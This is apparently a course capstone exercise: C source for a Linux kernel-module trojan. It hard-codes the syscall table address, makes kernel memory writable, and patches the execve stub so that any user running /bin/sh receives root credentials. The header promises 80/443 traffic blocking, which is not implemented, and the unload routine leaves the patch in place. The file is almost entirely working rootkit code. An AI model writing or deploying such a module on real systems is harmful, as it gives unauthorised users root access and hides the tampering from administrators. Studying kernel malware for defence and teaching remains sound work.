/* Capstone Exercise - LKM Trojan
	1 - intercept syscalls to execve
	2 - provide a root shell to normal user
	3 - block 80/443 TCP traffic */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/semaphore.h>
#include <linux/mm.h>
#include <linux/highmem.h>
#include <asm/unistd.h>

#define DRIVER_AUTHOR "focalpoint"
#define DRIVER_DESC   "Capstone"

MODULE_LICENSE("GPL");           // Get rid of taint message by declaring code as GPL.

/*  Or with defines, like this: */
MODULE_AUTHOR(DRIVER_AUTHOR);    // Who wrote this module?
MODULE_DESCRIPTION(DRIVER_DESC); // What does this module do?

int init(void);
void cleanup(void);

int set_page_rw(long unsigned long _addr)
{
	unsigned int level;
	pte_t *pte = lookup_address(_addr, &level);
	if(pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
	return 0;
}

void **sys_call_table;

asmlinkage long (*original_call) (const char __user * filename,
				const char __user * const __user * argv,
				const char __user * const __user * envp);

//asmlinkage long sys_unlink(const char *pathname)
asmlinkage long my_execve(const char __user * filename,
				const char __user * const __user * argv,
				const char __user * const __user * envp)
{
	const char shell[] = "/bin/sh";
	char buf[sizeof(shell)];
	if(!strncpy_from_user(buf, filename, sizeof(shell)-1)) {
		printk("Failed to copy user argument\n");
		return original_call(filename, argv, envp);
	}
	buf[sizeof(shell)-1] = 0;
	if(!strcmp(buf, shell)) {
		printk("Intercepted execve with filename /bin/sh\n");
		current->cred = prepare_kernel_cred(NULL);
		return original_call(filename, argv , envp);
	}
    
   printk("Intercepted other execve\n");
   return original_call(filename, argv, envp);
}

int init_module()
{
    // sys_call_table address in System.map
	//[user@localhost labs]$ cat /boot/System.map-2.6.32-358.el6.x86_64 | grep sys_call_table
	//ffffffff816004a0 R sys_call_table
	//ffffffff8160a5f8 r ia32_sys_call_table
	printk("Init module: trojan\n");
	
	void *execve_stub;
	void *insert_addr;
	uint32_t new_offset;
	/* get address of sys_call_table */
	sys_call_table = (void **)0xffffffff816c6ee0;
	printk("Sys call table address at: %p\n", (void*)sys_call_table);
	execve_stub = sys_call_table[__NR_execve];
	printk("Execve stub at: %p\n", execve_stub);

	insert_addr = execve_stub + 0x43 + 1;
	printk("Replace callq at: %p\n", insert_addr);
	//printk("saved old offset 0x%04X\n", (int)*insert_addr);
	printk("New execve addr at: %p\n", my_execve);

	new_offset = (long)my_execve - ((long)insert_addr + 4);
	printk("New offset 0x%04X\n", new_offset);
	
	/* change page attributes to RW */
	set_page_rw((unsigned long) insert_addr);
	
	/* replace function call address of unlink */
	//printk("Saved")
	memcpy(insert_addr, &new_offset, 4);
	original_call = 0xffffffff8120b750;
	//printk("Overwritten callq 0x%04X\n", &insert_addr);

    return 0;
}

void cleanup_module()
{	
	printk("Unloading module\n");
   // Restore the original call to unlink
   //sys_call_table[__NR_execve] = original_call;
}
